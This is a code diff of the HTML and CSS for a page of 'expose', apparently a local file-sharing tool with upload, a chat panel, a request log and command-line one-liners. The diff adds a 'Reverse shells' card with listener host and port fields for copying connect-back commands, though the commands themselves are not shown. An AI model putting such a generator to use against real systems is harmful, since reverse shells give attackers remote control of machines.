-  background:color-mix(in srgb,var(--bg) 50%,#fff);border:1px solid var(--rule);
-  padding:.75rem 1rem;white-space:pre-wrap;word-break:break-all;
-  max-height:16rem;overflow-y:auto;line-height:1.6}
-.ctx-copy{font-family:var(--ui);font-size:.6875rem;background:var(--ink);color:var(--bg);border:none;padding:.25rem .75rem;border-radius:3px;cursor:pointer;margin-top:.5rem;transition:background .12s}.ctx-copy:hover{background:var(--accent)}
-.ctx-file{display:flex;align-items:baseline;gap:.5rem;padding:.5rem 0;
-  border-bottom:1px solid var(--rule)}
-.ctx-file .fn{flex:1;font-family:var(--code);font-size:.8125rem;color:var(--ink);font-weight:600;
-  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.ctx-file .fs{font-family:var(--code);font-size:.6875rem;color:var(--dim2)}
-.ctx-file .dd{font-size:.75rem;color:var(--accent);text-decoration:none;font-family:var(--ui)}
-.ctx-file .dd:hover{color:var(--accent-h)}
-.crumbs{font-family:var(--code);font-size:.6875rem;color:var(--dim);margin-bottom:.5rem}
-.crumbs a{color:var(--accent);text-decoration:none}.crumbs a:hover{text-decoration:underline}
-.de{display:flex;align-items:baseline;gap:.5rem;padding:.3rem 0;
-  border-bottom:1px solid color-mix(in srgb,var(--rule) 50%,transparent);font-size:.8125rem}
-.de .fn{flex:1;font-family:var(--code);font-size:.75rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.de .fn a{color:var(--ink);text-decoration:none}.de .fn a:hover{color:var(--accent)}
-.de.is-dir .fn a{color:var(--accent)}
-.de .fs{font-family:var(--code);font-size:.6875rem;color:var(--dim2);white-space:nowrap;min-width:4rem;text-align:right}
-.de .dd{font-size:.6875rem;color:var(--accent);text-decoration:none;font-family:var(--ui)}
-.de .dd:hover{color:var(--accent-h)}
-.ctx-catch{font-size:.8125rem;color:var(--dim);padding:.5rem 0;border-bottom:1px solid var(--rule)}
-.sep{margin:clamp(1.25rem,3vw,2rem) 0 .375rem;padding-top:.625rem;
-  border-top:1px solid var(--rule)}
-.sep span{font-size:.6875rem;color:var(--dim);text-transform:uppercase;letter-spacing:.06em}
+/* ── upload ─────────────────────────────────────────────── */
+.drop{border:1.5px dashed var(--brd2);border-radius:12px;padding:28px 20px;text-align:center;
+  color:var(--dim);cursor:pointer;transition:border-color .18s,background .18s}
+.drop:hover,.drop:focus-visible{border-color:var(--acc-bd2);background:var(--acc-faint)}
+.drop.over{border-color:var(--acc);background:var(--accsoft)}
+.drop-ic{width:26px;height:26px;color:var(--fnt);margin-bottom:10px;transition:transform .18s,color .18s}
+.drop:hover .drop-ic{color:var(--acc)}
+.drop.over .drop-ic{color:var(--acc);transform:translateY(-3px)}
+.drop-t{font-size:13.5px}
+.drop-s{font-size:11.5px;color:var(--fnt);margin-top:3px}
+.queue{display:flex;flex-direction:column;gap:6px;margin-top:12px}
+.queue:empty{margin-top:0}
+.qi{display:grid;grid-template-columns:22px 1fr auto auto;align-items:center;gap:10px;
+  background:var(--srf2);border:1px solid var(--brd);border-radius:9px;padding:8px 10px;
+  animation:fadeUp .25s ease both}
+.qi .ic{width:15px;height:15px;color:var(--fnt)}
+.qi .qn{font:12.5px var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.qi .qs{font:11.5px var(--mono);color:var(--fnt)}
+.up-acts{display:flex;gap:8px;margin-top:12px}
+.prog{height:3px;background:var(--srf3);border-radius:99px;overflow:hidden;margin-top:12px}
+.prog i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--acc2),var(--acc));
+  border-radius:99px;transition:width .18s ease}
+.up-msg{margin-top:10px;font-size:12.5px;min-height:0}
+.up-msg:empty{display:none}
+.up-msg.ok{color:var(--acc)}
+.up-msg.err{color:var(--red)}
 
-/* ── footer ── */
-footer{margin-top:auto;padding:1rem;text-align:center;font-size:.625rem;
-  color:var(--dim2);letter-spacing:.02em}
+/* ── received files ─────────────────────────────────────── */
+.disk{display:flex;flex-direction:column}
+.di{display:grid;grid-template-columns:22px 1fr auto;align-items:center;gap:10px;
+  padding:9px 10px;border-radius:9px;animation:fadeUp .3s ease both}
+.di:hover{background:var(--srf2)}
+.di .ic{width:15px;height:15px;color:var(--fnt)}
+.di .dn{font:12.5px var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.di .dm{font:11px var(--mono);color:var(--fnt);margin-top:1px}
+.di .da{display:flex;gap:2px;align-items:center}
+.di .da .btn{margin-left:4px}
+.di.confirm .dx{color:var(--red);background:rgba(248,113,113,.12)}
+.disk-empty{padding:16px 4px 6px;color:var(--fnt);font-size:12.5px}
 
-@media(max-width:30rem){.shell{padding-left:.75rem;padding-right:.75rem}}
+/* ── footer ─────────────────────────────────────────────── */
+.foot{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;
+  color:var(--fnt);font-size:12px;padding:10px 0 6px}
+.foot b{color:var(--dim)}
+.foot .fsep{opacity:.5}
 
-/* ── log panel (bottom drawer) ── */
-.lp{position:fixed;bottom:0;left:0;right:0;z-index:900;
-  display:flex;flex-direction:column;max-height:70vh;
-  font-family:var(--code);font-size:.75rem;
-  background:#1a1917;color:#c8c5be;
-  box-shadow:0 -2px 12px rgba(0,0,0,.25);
-  transition:max-height .25s cubic-bezier(.2,1,.3,1)}
-.lp.collapsed{max-height:2rem}
-.lp.collapsed .lp-body,.lp.collapsed .lp-search,.lp.collapsed .lp-acts{display:none}
-.lp-bar{display:flex;align-items:center;gap:.5rem;padding:.35rem .75rem;
-  background:#222119;border-top:1px solid #3a3830;cursor:pointer;
-  user-select:none;flex-shrink:0;min-height:2rem}
-.lp-bar:hover{background:#2a2820}
-.lp-title{font-size:.6875rem;color:#84817a;text-transform:uppercase;letter-spacing:.08em;font-weight:600}
-.lp-badge{font-size:.625rem;background:var(--accent);color:#fff;padding:.05rem .4rem;
-  border-radius:2px;min-width:1.2rem;text-align:center;font-weight:600}
-.lp-badge:empty{display:none}
-.lp-search{margin-left:auto;background:#1a1917;border:1px solid #3a3830;color:#c8c5be;
-  font-family:var(--code);font-size:.6875rem;padding:.15rem .4rem;width:12rem;
-  outline:none;border-radius:0}
-.lp-search:focus{border-color:#666}
-.lp-search::placeholder{color:#5a5850}
-.lp-acts{display:flex;gap:.5rem;margin-left:.5rem}
-.lp-btn{background:none;border:none;color:#84817a;font-family:var(--code);
-  font-size:.625rem;cursor:pointer;padding:.1rem .3rem;text-transform:uppercase;
-  letter-spacing:.04em}
-.lp-btn:hover{color:#c8c5be}
-.lp-btn.active{color:var(--accent)}
-.lp-body{overflow-y:auto;flex:1;padding:0;max-height:calc(70vh - 2rem);scrollbar-width:thin;
-  scrollbar-color:#3a3830 transparent}
-.lp-body::-webkit-scrollbar{width:6px}
-.lp-body::-webkit-scrollbar-thumb{background:#3a3830;border-radius:3px}
-.lp-empty{padding:1.5rem;text-align:center;color:#5a5850;font-size:.75rem}
-/* entry row */
-.le{display:flex;align-items:baseline;gap:.5rem;padding:.2rem .75rem;
-  border-bottom:1px solid #222119;cursor:pointer;transition:background .08s}
-.le:hover{background:#222119}
-.le.expanded{background:#1e1d1a}
-.le-n{color:#5a5850;min-width:2rem;text-align:right}
-.le-time{color:#5a5850;min-width:4.5rem}
-.le-m{font-weight:700;min-width:3.5rem}
-.le-m.get{color:#6dae58}.le-m.post{color:#5c8abf}.le-m.put{color:#c89b3f}
-.le-m.delete{color:#c25450}.le-m.patch{color:#9c78c2}.le-m.head{color:#84817a}
-.le-m.options{color:#84817a}
-.le-path{color:#79b8d4;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.le-code{min-width:2rem;text-align:right;font-weight:600}
-.le-code.c2{color:#6dae58}.le-code.c3{color:#c89b3f}.le-code.c4{color:#c25450}.le-code.c5{color:#c25450}
-.le-ip{color:#84817a;min-width:7rem}
-.le-ua{color:#5a5850;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:12rem}
-/* expanded detail */
-.le-detail{display:none;padding:.35rem .75rem .5rem 3.25rem;
-  border-bottom:1px solid #2a2820;font-size:.6875rem;line-height:1.65;
-  color:#a09d96;background:#1a1917}
-.le.expanded+.le-detail{display:block}
-.le-detail .dk{color:#5c8abf;display:inline-block;min-width:9rem}
-.le-detail .dv{color:#c8c5be}
-.le-detail .dcurl{margin-top:.35rem;padding:.3rem .5rem;background:#151412;
-  border:1px solid #2a2820;color:#b0ad96;word-break:break-all;user-select:all;
-  cursor:text;white-space:pre-wrap}
-.le-detail .dbody{margin-top:.25rem}
-.le-detail .dbody-pre{display:block;margin-top:.2rem;padding:.3rem .5rem;background:#151412;
-  border:1px solid #2a2820;color:#a8d8a0;font-family:var(--code);font-size:.6875rem;
-  white-space:pre-wrap;word-break:break-all;max-height:8rem;overflow-y:auto;
-  scrollbar-width:thin;scrollbar-color:#3a3830 transparent}
-.le-hl{background:#4a3a10;color:#e8d070}
+/* ── chat ───────────────────────────────────────────────── */
+.chat{position:fixed;right:18px;bottom:60px;z-index:60;width:330px;max-width:calc(100vw - 36px);
+  background:var(--srf);border:1px solid var(--brd2);border-radius:13px;box-shadow:var(--sh);
+  display:flex;flex-direction:column;overflow:hidden;animation:chatIn .22s ease both;
+  transition:bottom .22s ease}
+body.log-open .chat{bottom:calc(min(46vh,440px) + 14px)}
+@keyframes chatIn{from{opacity:0;transform:translateY(10px) scale(.98)}to{opacity:1;transform:none}}
+.chat-h{display:flex;align-items:center;gap:8px;padding:11px 13px;border-bottom:1px solid var(--brd)}
+.chat-h h3{font-size:13px;font-weight:650}
+.chat-h .hint{flex:1}
+.chat-body{height:240px;overflow-y:auto;padding:10px 13px;display:flex;flex-direction:column;gap:7px}
+.cm{display:flex;gap:8px;align-items:baseline;animation:fadeUp .2s ease both;
+  position:relative;cursor:pointer;border-radius:6px;padding:2px 6px;margin:0 -6px;
+  transition:background .15s}
+.cm:hover{background:var(--srf2)}
+.cm:hover::after{content:"copy";position:absolute;right:6px;top:50%;transform:translateY(-50%);
+  font:600 9.5px var(--mono);letter-spacing:.05em;color:var(--fnt);
+  background:var(--srf3);border:1px solid var(--brd);border-radius:4px;padding:1px 5px}
+.cm .ct{font:10.5px var(--mono);color:var(--fnt);flex:none}
+.cm .cx{font-size:13px;word-break:break-word}
+.chat-bar{display:flex;gap:8px;padding:10px;border-top:1px solid var(--brd)}
+.chat-bar input{flex:1;background:var(--bg);border:1px solid var(--brd);border-radius:8px;
+  color:var(--txt);font:inherit;padding:8px 11px;outline:none;transition:border-color .15s}
+.chat-bar input:focus{border-color:var(--acc-bd2)}
 
-/* ── chat ── */
-.chat-panel{border:1px solid var(--rule);border-radius:6px;overflow:hidden;margin-top:.5rem}
-.chat-body{padding:.75rem;max-height:16rem;overflow-y:auto;display:flex;flex-direction:column;gap:.25rem}
-.cm{display:flex;align-items:baseline;gap:.5rem;font-size:.75rem;padding:.15rem 0}
-.ct{color:var(--dim);font-family:var(--code);font-size:.625rem;flex-shrink:0}
-.cn{color:var(--dim2);font-family:var(--code);font-size:.625rem;flex-shrink:0;min-width:2rem;text-align:right}
-.cx{color:var(--ink);word-break:break-all;line-height:1.4}
-.chat-bar{display:flex;border-top:1px solid var(--rule)}
-.chat-input{flex:1;background:var(--br);border:none;color:var(--ink);font-family:var(--ui);font-size:.8125rem;padding:.6rem .75rem;outline:none}
-.chat-input::placeholder{color:var(--dim2)}
-.chat-send{background:var(--ink);color:var(--bg);border:none;font-family:var(--ui);font-size:.75rem;font-weight:600;padding:.6rem 1rem;cursor:pointer;transition:background .12s}
-.chat-send:hover{background:var(--accent)}
-</style></head><body>
+/* ── request log drawer ─────────────────────────────────── */
+.log{position:fixed;left:0;right:0;bottom:0;z-index:50;
+  background:var(--log-bg);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+  border-top:1px solid var(--brd);transition:height .22s ease}
+.log.collapsed{height:44px}
+.log:not(.collapsed){height:min(46vh,440px)}
+.log-bar{display:flex;align-items:center;gap:10px;height:44px;padding:0 14px;cursor:pointer;user-select:none}
+.log-bar h3{font-size:12.5px;font-weight:650;letter-spacing:.02em}
+.live{width:7px;height:7px;border-radius:99px;background:var(--acc);flex:none;
+  box-shadow:0 0 0 0 var(--acc-bd);animation:live 2s infinite}
+.live.paused{background:var(--amb);animation:none}
+@keyframes live{0%{box-shadow:0 0 0 0 var(--acc-bd)}70%{box-shadow:0 0 0 7px rgba(52,211,153,0)}100%{box-shadow:0 0 0 0 rgba(52,211,153,0)}}
+.count{font:600 11px var(--mono);color:var(--acc);background:var(--accsoft);
+  border:1px solid var(--acc-bd);border-radius:99px;padding:2px 8px}
+.count:empty{display:none}
+.log-search{flex:1;max-width:260px;margin-left:auto;background:var(--bg);border:1px solid var(--brd);
+  border-radius:7px;color:var(--txt);font:12px var(--mono);padding:6px 10px;outline:none;transition:border-color .15s}
+.log-search:focus{border-color:var(--acc-bd2)}
+.log-acts{display:flex;align-items:center;gap:4px}
+.log-acts .btn.ghost{padding:5px 9px;font-size:11.5px;background:transparent}
+#log-pause.active{color:var(--amb);border-color:rgba(251,191,36,.4)}
+#log-chev svg{transition:transform .2s}
+.log.collapsed #log-chev svg{transform:rotate(180deg)}
+.log-body{height:calc(100% - 44px);overflow-y:auto;padding:2px 14px 14px;font:12px/1.5 var(--mono)}
+.log.collapsed .log-body{display:none}
+.log-empty{color:var(--fnt);text-align:center;padding:26px 0;font-size:12px}
+.le{display:grid;grid-template-columns:34px 62px 64px 1fr 44px 110px 170px;gap:10px;align-items:center;
+  padding:5px 8px;border-radius:7px;cursor:pointer;animation:fadeUp .2s ease both}
+.le:hover{background:var(--srf2)}
+.le.expanded{background:var(--srf2);border-radius:7px 7px 0 0}
+.le-n{color:var(--fnt)}
+.le-time{color:var(--fnt)}
+.le-m{font-weight:700;font-size:11px;letter-spacing:.03em}
+.le-m.get{color:var(--acc)} .le-m.post{color:var(--blu)} .le-m.put{color:var(--amb)}
+.le-m.delete{color:var(--red)} .le-m.patch{color:var(--vio)}
+.le-path{color:var(--txt)}
+.le-code{font-weight:600}
+.le-code.c2{color:var(--acc)} .le-code.c3{color:var(--blu)}
+.le-code.c4{color:var(--amb)} .le-code.c5{color:var(--red)}
+.le-ip{color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.le-ua{color:var(--fnt);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.le-hl{background:var(--hl);color:#fff;border-radius:2px}
+.le-detail{display:none;padding:10px 12px 12px;background:var(--srf2);border-radius:0 0 7px 7px;margin-bottom:6px}
+.le-detail.open{display:block;animation:fadeUp .18s ease both}
+.ld-grid{display:grid;grid-template-columns:auto 1fr;gap:3px 14px;margin-bottom:8px}
+.ld-grid .dk{color:var(--fnt);white-space:nowrap}
+.ld-grid .dv{color:var(--txt);word-break:break-all}
+.dbody-pre{background:var(--bg);border:1px solid var(--brd);border-radius:7px;
+  padding:9px 11px;margin:6px 0;max-height:180px;overflow:auto;white-space:pre-wrap;word-break:break-all;color:var(--dim)}
+.dcurl{display:flex;align-items:flex-start;gap:8px;background:var(--bg);border:1px solid var(--brd);
+  border-radius:7px;padding:9px 11px;color:var(--fnt);white-space:pre-wrap;word-break:break-all}
+.dcurl code{flex:1;background:none;border:0;padding:0;color:var(--dim)}
+.dcurl .iconbtn{margin-top:-2px}
 
-<div class="shell">
-  <header>
-    <span class="id"><b>expose</b></span>
-    <span class="pipe">/</span>
-    <span class="path" id="hpath">&hellip;</span>
-  </header>
+/* ── overlay + toast ────────────────────────────────────── */
+.overlay{position:fixed;inset:0;z-index:100;display:grid;place-items:center;
+  background:var(--ov-bg);backdrop-filter:blur(4px);animation:fadeUp .15s ease both}
+.ov-box{display:flex;flex-direction:column;align-items:center;gap:14px;
+  border:2px dashed var(--acc);border-radius:20px;padding:44px 64px;color:var(--acc);
+  background:var(--accsoft);font-size:16px;font-weight:600}
+.ov-box svg{width:34px;height:34px}
+.toast{position:fixed;top:16px;left:50%;transform:translateX(-50%) translateY(-8px);z-index:110;
+  background:var(--srf3);border:1px solid var(--brd2);border-radius:99px;padding:8px 16px;
+  font-size:12.5px;font-weight:550;box-shadow:var(--sh);opacity:0;pointer-events:none;
+  transition:opacity .18s,transform .18s}
+.toast.vis{opacity:1;transform:translateX(-50%) translateY(0)}
 
-  <div class="ctx" id="ctx"></div>
+/* ── responsive ─────────────────────────────────────────── */
+@media (max-width:760px){
+  .le{grid-template-columns:30px 56px 58px 1fr 40px}
+  .le-ip,.le-ua{display:none}
+  .top-acts .btn span{display:none}
+  .hero-file .sp{display:none}
+  .chat{right:10px;left:10px;width:auto}
+  .log-search{max-width:130px}
+  .card-h{flex-direction:column;gap:2px}
+}
+@media (max-width:520px){
+  .log-search{display:none}
+}
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.01ms !important;transition-duration:.01ms !important}
+}
 
-  <div class="sep"><span>upload</span></div>
+/* ── theme toggle / sound / stats / flags ───────────────── */
+#log-sound.active{color:var(--acc);border-color:var(--acc-bd)}
+#log-badge{cursor:pointer;user-select:none}
+#log-badge:hover{filter:brightness(1.15)}
+.stats{position:fixed;right:14px;bottom:54px;z-index:70;width:300px;
+  background:var(--srf);border:1px solid var(--brd2);border-radius:13px;box-shadow:var(--sh);
+  padding:14px;animation:chatIn .18s ease both}
+.stats h4{font-size:11px;font-weight:650;letter-spacing:.06em;text-transform:uppercase;color:var(--fnt);margin:8px 0 6px}
+.stats h4:first-child{margin-top:0}
+.st-row{display:flex;justify-content:space-between;gap:10px;font:11.5px var(--mono);
+  padding:3px 0;color:var(--dim)}
+.st-row b{color:var(--txt);font-weight:600}
+.st-row .st-k{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.st-chips{display:flex;flex-wrap:wrap;gap:5px}
+.st-chip{font:600 10.5px var(--mono);padding:3px 8px;border-radius:99px;
+  background:var(--srf2);border:1px solid var(--brd);color:var(--dim)}
+.le-path{display:flex;align-items:center;gap:7px;min-width:0}
+.le-p{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.le-flag{flex:none;font:700 9px var(--mono);letter-spacing:.05em;color:var(--red);
+  border:1px solid var(--red);border-radius:4px;padding:0 4px;background:rgba(248,113,113,.08)}
+@media (max-width:760px){
+  .stats{right:10px;left:10px;width:auto}
+}
 
-  <div class="drop" id="drop">
-    <p>Drop files or <a id="browse">select</a></p>
-    <input type="file" id="fi" multiple>
-  </div>
+/* ── CLI one-liners ─────────────────────────────────────── */
+.os-pills{margin-left:auto;display:flex;gap:4px}
+.os-pill{padding:5px 11px;border-radius:99px;font-size:11.5px;font-weight:600;
+  color:var(--fnt);border:1px solid transparent;transition:color .15s,background .15s}
+.os-pill:hover{color:var(--txt)}
+.os-pill.active{color:var(--acc);background:var(--accsoft);border-color:var(--acc-bd)}
+.cmd-g{margin-bottom:14px}
+.cmd-g:last-child{margin-bottom:0}
+.cmd-g h4{font:600 10.5px var(--mono);letter-spacing:.07em;text-transform:uppercase;
+  color:var(--fnt);margin-bottom:6px}
+.cmd{display:grid;grid-template-columns:118px 1fr auto;align-items:center;gap:10px;
+  background:var(--srf2);border:1px solid var(--brd);border-radius:8px;
+  padding:7px 10px;margin-bottom:5px;animation:fadeUp .25s ease both}
+.cmd-t{font:600 11px var(--mono);color:var(--dim);white-space:nowrap}
+.cmd-c{font:11.5px var(--mono);color:var(--txt);overflow-x:auto;white-space:nowrap;
+  scrollbar-width:none;background:none;border:0;padding:0;border-radius:0}
+.cmd-c::-webkit-scrollbar{display:none}
+@media (max-width:760px){
+  .cmd{grid-template-columns:86px 1fr auto}
+  .card-h{position:relative}
+  .os-pills{margin:6px 0 0}
+}
 
-  <div class="queue" id="queue"></div>
-  <div class="qn" id="qn"></div>
+/* ── collapsible CLI card ───────────────────────────────── */
+.cli-h{cursor:pointer;user-select:none;margin-bottom:0;align-items:center}
+#cli-card:not(.collapsed) .cli-h{margin-bottom:14px}
+#cli-chev{margin-left:4px}
+#cli-card.collapsed .os-pills{display:none}
+#cli-card.collapsed #cli-chev{margin-left:auto}
+#cli-chev svg{transition:transform .2s}
+#cli-card.collapsed #cli-chev svg{transform:rotate(-90deg)}
+#cli-card.collapsed #cmds{display:none}
+@media (max-width:760px){
+  .cli-h{position:relative}
+  .cli-h .os-pills{margin:6px 0 0}
+}
 
-  <div class="acts" id="acts">
-    <button class="abtn" id="send">Send</button>
-    <button class="aclr" id="clr">clear</button>
-  </div>
+/* ── collapsible reverse-shell card ─────────────────────── */
+.rs-h{cursor:pointer;user-select:none;margin-bottom:0;align-items:center}
+#rs-card:not(.collapsed) .rs-h{margin-bottom:14px}
+#rs-chev{margin-left:4px}
+#rs-card.collapsed .os-pills{display:none}
+#rs-card.collapsed #rs-chev{margin-left:auto}
+#rs-chev svg{transition:transform .2s}
+#rs-card.collapsed #rs-chev svg{transform:rotate(-90deg)}
+#rs-card.collapsed #rs-body{display:none}
+.rs-cfg{display:flex;gap:14px;align-items:center;flex-wrap:wrap;margin-bottom:14px}
+.rs-cfg label{font:600 10.5px var(--mono);letter-spacing:.05em;color:var(--fnt);
+  display:flex;gap:7px;align-items:center}
+.rs-in{background:var(--bg);border:1px solid var(--brd);border-radius:7px;
+  color:var(--txt);font:12px var(--mono);padding:5px 9px;width:150px;outline:none;
+  transition:border-color .15s}
+.rs-in:focus{border-color:var(--acc-bd2)}
+#rs-port{width:72px}
 
-  <div class="prog" id="prog"><i id="bar"></i></div>
-  <div class="msg" id="msg"></div>
+/* ── "best option" chips ────────────────────────────────── */
+.cmd-t{display:flex;align-items:center;gap:6px;min-width:0}
+.cmd-best{flex:none;font:700 8.5px var(--mono);letter-spacing:.05em;color:var(--acc);
+  border:1px solid var(--acc-bd);border-radius:4px;padding:1px 4px;
+  background:var(--accsoft);white-space:nowrap;text-transform:uppercase}
+</style></head>
+<body>
 
-  <div class="div" id="divider"><span>on disk</span></div>
-  <div class="disk" id="disk"></div>
-  <div class="dn" id="dn"></div>
-</div>
+<div class="glow" aria-hidden="true"></div>
 
-<div class="chat-panel" id="chat-panel">
-  <div class="chat-body" id="chat-body"></div>
-  <div class="chat-bar">
-    <input class="chat-input" id="chat-input" type="text" placeholder="message..." autocomplete="off" spellcheck="false">
-    <button class="chat-send" id="chat-send">send</button>
-  </div>
-</div>
-
-<footer>expose &mdash; uploads save to ~/Downloads/expose</footer>
-
-<div class="lp collapsed" id="lp">
-  <div class="lp-bar" id="lp-bar">
-    <span class="lp-title">log</span>
-    <span class="lp-badge" id="lp-badge"></span>
-    <input class="lp-search" id="lp-search" type="text" placeholder="filter&hellip;" autocomplete="off" spellcheck="false">
-    <div class="lp-acts">
-      <button class="lp-btn" id="lp-pause" title="Pause polling">pause</button>
-      <button class="lp-btn" id="lp-export" title="Copy log as JSON">export</button>
-      <button class="lp-btn" id="lp-clear" title="Clear log">clear</button>
+<header class="top">
+  <div class="wrap top-in">
+    <div class="brand">
+      <span class="logo" aria-hidden="true"><svg class="expose-mark" viewBox="0 0 64 52" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M7 15.5 23.5 6 40 15.5v19L23.5 44 7 34.5v-19Z"
+        stroke="currentColor" stroke-width="3.5" stroke-linejoin="round"/>
+  <path d="m16 19 14 8-14 8V19Z" fill="var(--acc, #10b981)"/>
+  <path d="m38 17 11-6M40 26h15M38 35l11 6"
+        stroke="var(--acc, #10b981)" stroke-width="3.5" stroke-linecap="round"/>
+  <circle cx="52" cy="9.5" r="3" fill="currentColor"/>
+  <circle cx="58" cy="26" r="3" fill="currentColor"/>
+  <circle cx="52" cy="42.5" r="3" fill="currentColor"/>
+</svg></span>
+      <span class="word">expose</span>
+      <span class="badge" id="mode-badge">&hellip;</span>
+    </div>
+    <div class="top-acts">
+      <button class="btn ghost sm" id="theme-toggle" title="Theme: auto (system)">
+        <svg viewBox="0 0 24 24" id="theme-ic"><circle cx="12" cy="12" r="9"/><path d="M12 3a9 9 0 0 1 0 18z" fill="currentColor" stroke="none"/></svg>
+      </button>
+      <button class="btn ghost sm" id="copy-url" title="Copy this page's URL">
+        <svg viewBox="0 0 24 24"><path d="M10 14a5 5 0 0 0 7.1 0l2.4-2.4a5 5 0 0 0-7.1-7.1l-1.2 1.2"/><path d="M14 10a5 5 0 0 0-7.1 0l-2.4 2.4a5 5 0 0 0 7.1 7.1l1.2-1.2"/></svg>
+        <span>Copy link</span>
+      </button>
+      <button class="btn ghost sm" id="chat-toggle" title="Toggle chat">
+        <svg viewBox="0 0 24 24"><path d="M21 12a8 8 0 0 1-8 8c-1.4 0-2.8-.4-3.9-1L3 20l1.1-5.1A8 8 0 1 1 21 12z"/></svg>
+        <span>Chat</span>
+        <i class="dot" id="chat-dot" hidden></i>
+      </button>
     </div>
   </div>
-  <div class="lp-body" id="lp-body">
-    <div class="lp-empty" id="lp-empty">waiting for requests&hellip;</div>
+</header>
+
+<main class="wrap">
+
+  <!-- Mode-aware hero: filled by JS -->
+  <section class="card hero" id="hero" hidden></section>
+
+  <!-- Upload -->
+  <section class="card" id="upload-card">
+    <div class="card-h">
+      <h2>Send files</h2>
+      <span class="hint">anything dropped here lands on this machine</span>
+    </div>
+    <div class="drop" id="drop" tabindex="0" role="button" aria-label="Drop files or browse">
+      <svg class="drop-ic" viewBox="0 0 24 24"><path d="M12 16V4m0 0l-4 4m4-4l4 4"/><path d="M4 15v3a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-3"/></svg>
+      <p class="drop-t">Drag &amp; drop files here, or <button class="linklike" id="browse" type="button">browse</button></p>
+      <p class="drop-s">multiple files welcome</p>
+      <input type="file" id="fi" multiple hidden>
+    </div>
+    <div class="queue" id="queue"></div>
+    <div class="up-acts" id="up-acts" hidden>
+      <button class="btn primary" id="send">
+        <svg viewBox="0 0 24 24"><path d="M12 19V5m0 0l-5 5m5-5l5 5"/></svg>
+        Send <span id="send-n"></span>
+      </button>
+      <button class="btn ghost" id="clr">Clear</button>
+    </div>
+    <div class="prog" id="prog" hidden><i id="bar"></i></div>
+    <div class="up-msg" id="msg" role="status"></div>
+  </section>
+
+  <!-- Received files -->
+  <section class="card" id="recv-card">
+    <div class="card-h">
+      <h2>Received</h2>
+      <span class="hint" id="recv-n"></span>
+    </div>
+    <div class="disk" id="disk"></div>
+  </section>
+
+  <!-- CLI one-liners -->
+  <section class="card collapsed" id="cli-card">
+    <div class="card-h cli-h" id="cli-h">
+      <h2>Send from the command line</h2>
+      <span class="hint">no browser on the other machine? copy a one-liner</span>
+      <div class="os-pills" id="os-pills">
+        <button class="os-pill active" data-os="linux">Linux</button>
+        <button class="os-pill" data-os="macos">macOS</button>
+        <button class="os-pill" data-os="windows">Windows</button>
+      </div>
+      <button class="iconbtn" id="cli-chev" aria-label="Toggle commands"><svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg></button>
+    </div>
+    <div id="cmds"></div>
+  </section>
+
+  <!-- Reverse shells -->
+  <section class="card collapsed" id="rs-card">
+    <div class="card-h rs-h" id="rs-h">
+      <h2>Reverse shells</h2>
+      <span class="hint">connect back to your listener &mdash; one click to copy</span>
+      <div class="os-pills" id="rs-pills">
+        <button class="os-pill active" data-os="linux">Linux</button>
+        <button class="os-pill" data-os="macos">macOS</button>
+        <button class="os-pill" data-os="windows">Windows</button>
+      </div>
+      <button class="iconbtn" id="rs-chev" aria-label="Toggle reverse shells"><svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg></button>
+    </div>
+    <div id="rs-body">
+      <div class="rs-cfg">
+        <label>LHOST <input class="rs-in" id="rs-host" type="text" autocomplete="off" spellcheck="false"></label>
+        <label>LPORT <input class="rs-in" id="rs-port" type="text" autocomplete="off" spellcheck="false"></label>
+        <span class="hint">substituted into every command</span>
+      </div>
+      <div id="rcmds"></div>
+    </div>
+  </section>
+
+  <footer class="foot">
+    <span>served by <b>expose</b></span><span class="fsep">&middot;</span>
+    <span>received files land in <code>~/Downloads/expose</code></span><span class="fsep">&middot;</span>
+    <a href="/me">/me</a>
+  </footer>
+
+</main>
+
+<!-- Chat panel -->
+<aside class="chat" id="chat">
+  <div class="chat-h">
+    <h3>Chat</h3>
+    <span class="hint">everyone on this page sees this</span>
+    <button class="iconbtn" id="chat-close" aria-label="Close chat"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+  </div>
+  <div class="chat-body" id="chat-body"></div>
+  <div class="chat-bar">
+    <input id="chat-input" type="text" placeholder="Message&hellip;" autocomplete="off" spellcheck="false">
+    <button class="btn primary sm" id="chat-send" aria-label="Send message"><svg viewBox="0 0 24 24"><path d="M5 12h14m0 0l-6-6m6 6l-6 6"/></svg></button>
+  </div>
+</aside>
+
+<!-- Request log drawer -->
+<section class="log collapsed" id="log">
+  <div class="log-bar" id="log-bar" role="button" tabindex="0" aria-label="Toggle request log">
+    <span class="live" id="live" title="Polling for requests"></span>
+    <h3>Requests</h3>
+    <span class="count" id="log-badge"></span>
+    <input class="log-search" id="log-search" type="text" placeholder="Filter&hellip;" autocomplete="off" spellcheck="false">
+    <div class="log-acts">
+      <button class="btn ghost sm" id="log-sound" title="Sound on new request"><svg viewBox="0 0 24 24"><path d="M18 8a6 6 0 1 0-12 0c0 7-3 8-3 8h18s-3-1-3-8"/><path d="M10.3 21a2 2 0 0 0 3.4 0"/></svg></button>
+      <button class="btn ghost sm" id="log-pause">pause</button>
+      <button class="btn ghost sm" id="log-export">export</button>
+      <button class="btn ghost sm" id="log-clear">clear</button>
+      <button class="iconbtn" id="log-chev" aria-label="Collapse"><svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg></button>
+    </div>
+  </div>
+  <div class="log-body" id="log-body">
+    <div class="log-empty" id="log-empty">waiting for requests&hellip;</div>
